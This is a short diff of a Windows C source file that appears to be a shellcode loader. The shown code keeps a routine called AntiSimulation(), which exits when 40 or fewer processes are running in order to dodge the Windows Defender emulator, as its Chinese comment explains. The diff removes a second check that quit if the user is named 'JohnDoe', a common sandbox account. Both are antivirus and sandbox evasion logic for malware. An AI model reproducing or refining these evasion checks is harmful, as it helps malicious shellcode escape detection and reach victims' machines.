@@ -1,7 +1,5 @@
 #include<windows.h>
 #include<TlHelp32.h>
-#define numSandboxUser 1
-const WCHAR* sandboxUsername[numSandboxUser] = { L"JohnDoe" };
 
 //shellcode memory to execute
 LPVOID Memory;
@@ -79,8 +77,6 @@ struct CONFIG
 **********************************************************************/
 void AntiSimulation()
 {
-	WCHAR username[3267];
-	DWORD charCount = 3267;
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (INVALID_HANDLE_VALUE == hSnapshot)
 	{
@@ -95,14 +91,6 @@ void AntiSimulation()
 	if (procnum <= 40)  //判断当前进程是否低于40个，目前见过能模拟最多进程的是WD能模拟39个
 	{
 		exit(1);
-	}
-	if (!GetUserName(username, &charCount)) {
-		return;
-	}
-	for (int i = 0; i < numSandboxUser; ++i) {
-		if (wcsicmp(username, sandboxUsername[i]) == 0) {
-			exit(1);
-		}
 	}
 }
 
